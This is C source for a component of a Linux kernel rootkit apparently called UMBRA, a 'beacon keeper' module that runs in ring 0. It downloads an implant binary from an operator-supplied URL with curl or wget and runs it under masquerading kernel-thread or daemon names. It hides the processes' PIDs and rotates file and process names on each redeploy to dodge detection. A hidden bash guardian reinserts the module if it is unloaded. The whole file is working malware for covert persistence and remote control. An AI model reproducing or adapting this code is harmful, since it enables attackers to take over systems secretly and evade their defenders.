/*
 * UMBRA beacon keeper.
 *
 * Runs in ring-0 and supervises one operator-selected implant:
 *   - fetches the payload from an arbitrary URL on demand,
 *   - launches it with a masked argv[0],
 *   - re-fetches / re-launches it whenever the process dies,
 *   - rotates every visible name on each redeploy (artifact, ghost
 *     process title, pidfile) so no two generations look alike,
 *   - keeps a hidden userspace guardian alive to reinsert the module
 *     if it is ever unloaded.
 */
#include "../include/ub_core.h"
#include "../include/beacon.h"
#include "../include/veiled_pids.h"
#include "../include/edr_evade.h"
#include <linux/err.h>
#include <linux/random.h>
#include <linux/pid.h>

/* ---- operator configuration (insmod params) -------------------------- */
static char *ub_beacon_url = "";
module_param(ub_beacon_url, charp, 0600);
MODULE_PARM_DESC(ub_beacon_url, "URL of the beacon binary to fetch");

static char *ub_beacon_args = "";
module_param(ub_beacon_args, charp, 0600);
MODULE_PARM_DESC(ub_beacon_args, "Extra arguments passed to the beacon");

static char *ub_beacon_profile = "sliver";
module_param(ub_beacon_profile, charp, 0600);
MODULE_PARM_DESC(ub_beacon_profile, "Implant profile: sliver | metasploit | custom");

static char *ub_fetcher = "curl";
module_param(ub_fetcher, charp, 0600);
MODULE_PARM_DESC(ub_fetcher, "Fetcher binary: curl | wget");

static char *ub_stage_dir = "/tmp/.ub-state";
module_param(ub_stage_dir, charp, 0600);
MODULE_PARM_DESC(ub_stage_dir, "Staging directory for payloads and state");

static char *ub_guardian_ko = "/lib/modules/umbra.ko";
module_param(ub_guardian_ko, charp, 0600);
MODULE_PARM_DESC(ub_guardian_ko, "Path of the .ko the guardian reinserts");

static int ub_beacon_interval = 20;
module_param(ub_beacon_interval, int, 0600);
MODULE_PARM_DESC(ub_beacon_interval, "Liveness check interval in seconds");

/* ---- polymorphic name pools ------------------------------------------ */
static const char *const ub_ghost_sliver[] = {
    "[kworker/0:1]", "[kworker/u8:2]", "[ksoftirqd/0]",
    "[migration/0]", "[rcu_sched]", "[kcompactd0]", NULL
};
static const char *const ub_ghost_meta[] = {
    "[jbd2/sda1-8]", "[kblockd/0]", "[kswapd0]",
    "systemd-journald", "dbus-daemon", "irqbalance", NULL
};
static const char *const ub_ghost_custom[] = {
    "NetworkManager", "polkitd", "accounts-daemon",
    "systemd-udevd", "cron", "ssh-agent", NULL
};

static const char *const ub_artifact_sliver[] = {
    "libsystemd", "kbdcfg", "netprobe", "ucf-cache", NULL
};
static const char *const ub_artifact_meta[] = {
    "ms-link", "pam-cache", "dbus-poll", "xtables.lock", NULL
};
static const char *const ub_artifact_custom[] = {
    "loader", "stage", "payload", "module", NULL
};

/* ---- state ----------------------------------------------------------- */
static struct task_struct *ub_keeper_thread;
static atomic_t ub_redeploy_request = ATOMIC_INIT(0);
static atomic_t ub_generation = ATOMIC_INIT(0);
static DEFINE_MUTEX(ub_keeper_lock);

static char ub_beacon_pidfile[192];
static char ub_guardian_pidfile[192];
static char ub_heartbeat_file[192];

static char *envp[] = {
    "HOME=/",
    "TERM=xterm",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    NULL
};

/* ---- helpers --------------------------------------------------------- */
static inline unsigned int ub_name_seed(unsigned int salt)
{
    return get_random_u32() ^ (jiffies << (salt & 7)) ^ salt;
}

static const char *const *ub_pick_ghosts(const char *profile)
{
    if (profile && strcmp(profile, "metasploit") == 0)
        return ub_ghost_meta;
    if (profile && strcmp(profile, "custom") == 0)
        return ub_ghost_custom;
    return ub_ghost_sliver;
}

static const char *const *ub_pick_artifacts(const char *profile)
{
    if (profile && strcmp(profile, "metasploit") == 0)
        return ub_artifact_meta;
    if (profile && strcmp(profile, "custom") == 0)
        return ub_artifact_custom;
    return ub_artifact_sliver;
}

static int ub_read_pid(const char *path, pid_t *out)
{
    struct file *f;
    char buf[32];
    loff_t pos = 0;
    long n;
    pid_t pid;

    f = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(f))
        return -ENOENT;

    n = kernel_read(f, buf, sizeof(buf) - 1, &pos);
    filp_close(f, NULL);
    if (n <= 0)
        return -EIO;

    buf[n] = '\0';
    pid = simple_strtol(buf, NULL, 10);
    if (pid <= 0)
        return -EINVAL;

    *out = pid;
    return 0;
}

static bool ub_pid_alive(pid_t pid)
{
    struct task_struct *t;
    bool alive = false;

    rcu_read_lock();
    t = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (t && !(READ_ONCE(t->flags) & PF_EXITING))
        alive = true;
    rcu_read_unlock();

    return alive;
}

static bool ub_process_alive(const char *pidfile)
{
    pid_t pid = 0;

    if (ub_read_pid(pidfile, &pid) != 0)
        return false;
    return ub_pid_alive(pid);
}

static int ub_umh_launch(const char *command)
{
    char *argv[] = {"/bin/bash", "-c", (char *)command, NULL};
    struct subprocess_info *si;

    if (!ub_test_mode) {
        ub_umh_bypass_on();
        ub_veil_pid(current->pid);
        ub_veil_pid(current->tgid);
    } else {
        pr_info("UMBRA test: UMH cmd: %s\n", command);
    }

    si = call_usermodehelper_setup(argv[0], argv, envp,
                                   GFP_KERNEL, NULL, NULL, NULL);
    if (!si) {
        ub_umh_bypass_off();
        return -ENOMEM;
    }

    call_usermodehelper_exec(si, UMH_NO_WAIT);
    if (!ub_test_mode)
        ub_umh_bypass_off();
    return 0;
}

static void ub_write_heartbeat(void)
{
    struct file *f;
    char buf[32];
    loff_t pos = 0;
    int len;

    len = snprintf(buf, sizeof(buf), "%lu\n", jiffies / HZ);
    f = filp_open(ub_heartbeat_file, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (IS_ERR(f))
        return;
    kernel_write(f, buf, len, &pos);
    filp_close(f, NULL);
}

/* ---- beacon deployment ----------------------------------------------- */
static int ub_beacon_deploy(void)
{
    char *cmd;
    char artifact[96], ghost[96], pidfile[192];
    char fetch_cmd[320];
    const char *const *ghosts = ub_pick_ghosts(ub_beacon_profile);
    const char *const *artifacts = ub_pick_artifacts(ub_beacon_profile);
    unsigned int salt = (unsigned int)atomic_inc_return(&ub_redeploy_request);
    unsigned int gseed = ub_name_seed(salt);
    unsigned int aseed = ub_name_seed(salt + 17);
    int gi, ai;

    gi = (int)(gseed % 6);
    ai = (int)(aseed % 4);

    snprintf(artifact, sizeof(artifact), "%s-%u",
             artifacts[ai] ? artifacts[ai] : "svc", (gseed >> 8) % 100000u);
    snprintf(ghost, sizeof(ghost), "%s", ghosts[gi] ? ghosts[gi] : "[kworker/0:1]");
    snprintf(pidfile, sizeof(pidfile), "%s/.p%u", ub_stage_dir, (aseed >> 4) % 100000u);

    if (strcmp(ub_fetcher, "wget") == 0)
        snprintf(fetch_cmd, sizeof(fetch_cmd),
                 "wget -q -T 60 -O \"$f\" \"%s\" 2>/dev/null", ub_beacon_url);
    else
        snprintf(fetch_cmd, sizeof(fetch_cmd),
                 "curl -fsSL --max-time 60 \"%s\" -o \"$f\" 2>/dev/null", ub_beacon_url);

    cmd = kmalloc(1400, GFP_KERNEL);
    if (!cmd)
        return -ENOMEM;

    snprintf(cmd, 1400,
             "d=\"%s\"; mkdir -p \"$d\" 2>/dev/null; f=\"$d/%s\"; "
             "%s; [ -s \"$f\" ] || exit 1; chmod 700 \"$f\" 2>/dev/null; "
             "echo $$ > \"%s\"; exec -a \"%s\" \"$f\" %s",
             ub_stage_dir, artifact, fetch_cmd, pidfile, ghost, ub_beacon_args);

    strscpy(ub_beacon_pidfile, pidfile, sizeof(ub_beacon_pidfile));
    atomic_set(&ub_redeploy_request, salt);

    ub_umh_launch(cmd);
    kfree(cmd);
    return 0;
}

/* ---- guardian deployment --------------------------------------------- */
static int ub_guardian_deploy(void)
{
    char *cmd;
    char ghost[96], pidfile[192];
    unsigned int salt = (unsigned int)atomic_inc_return(&ub_generation);
    unsigned int seed = ub_name_seed(salt + 91);
    const char *const *ghosts = ub_pick_ghosts(ub_beacon_profile);

    snprintf(ghost, sizeof(ghost), "%s", ghosts[(seed >> 3) % 6] ? : "[ksoftirqd/0]");
    snprintf(pidfile, sizeof(pidfile), "%s/.g%u", ub_stage_dir, (seed >> 6) % 100000u);

    /*
     * The loop is quoted with single quotes only at the outer exec boundary;
     * its body uses double quotes so no nested quoting is required.
     */
    cmd = kmalloc(1400, GFP_KERNEL);
    if (!cmd)
        return -ENOMEM;

    snprintf(cmd, 1400,
             "d=\"%s\"; mkdir -p \"$d\" 2>/dev/null; echo $$ > \"%s\"; "
             "exec -a \"%s\" /bin/bash -c "
             "'while :; do sleep %d; hb=$(cat \"%s/hb\" 2>/dev/null); "
             "now=$(date +%%s); if [ -z \"$hb\" ] || "
             "[ $((now-hb)) -gt %d ]; then "
             "insmod \"%s\" 2>/dev/null; fi; done'",
             ub_stage_dir, pidfile, ghost, ub_beacon_interval,
             ub_stage_dir, ub_beacon_interval * 3, ub_guardian_ko);

    strscpy(ub_guardian_pidfile, pidfile, sizeof(ub_guardian_pidfile));
    ub_umh_launch(cmd);
    kfree(cmd);
    return 0;
}

/* ---- keeper loop ----------------------------------------------------- */
static int ub_keeper_loop(void *data)
{
    int interval = ub_beacon_interval > 0 ? ub_beacon_interval : 20;

    while (!kthread_should_stop()) {
        mutex_lock(&ub_keeper_lock);

        ub_write_heartbeat();

        if (!ub_test_mode && !ub_process_alive(ub_guardian_pidfile))
            ub_guardian_deploy();

        if (atomic_read(&ub_redeploy_request) ||
            !ub_process_alive(ub_beacon_pidfile)) {

            if (ub_test_mode)
                pr_info("UMBRA test: beacon missing/signalled, deploying generation\n");
            atomic_set(&ub_redeploy_request, 0);
            ub_beacon_deploy();
        }

        mutex_unlock(&ub_keeper_lock);

        set_current_state(TASK_INTERRUPTIBLE);
        schedule_timeout(interval * HZ);
        __set_current_state(TASK_RUNNING);
    }

    return 0;
}

/* ---- public API ------------------------------------------------------ */
notrace int ub_beacon_start(void)
{
    if (!ub_beacon_url || !*ub_beacon_url)
        return 0;

    snprintf(ub_heartbeat_file, sizeof(ub_heartbeat_file),
             "%s/hb", ub_stage_dir);

    ub_keeper_thread = kthread_run(ub_keeper_loop, NULL, "kworker/%u:%u",
                                   (unsigned int)(jiffies & 0xff), 1);
    if (IS_ERR(ub_keeper_thread)) {
        int ret = PTR_ERR(ub_keeper_thread);
        ub_keeper_thread = NULL;
        return ret;
    }

    atomic_set(&ub_redeploy_request, 1);
    return 0;
}

notrace void ub_beacon_stop(void)
{
    if (ub_keeper_thread && !IS_ERR(ub_keeper_thread)) {
        kthread_stop(ub_keeper_thread);
        ub_keeper_thread = NULL;
    }
    atomic_set(&ub_redeploy_request, 0);
}

notrace void ub_beacon_signal(void)
{
    atomic_set(&ub_redeploy_request, 1);
}

notrace bool ub_beacon_engaged(void)
{
    return ub_keeper_thread && !IS_ERR(ub_keeper_thread);
}
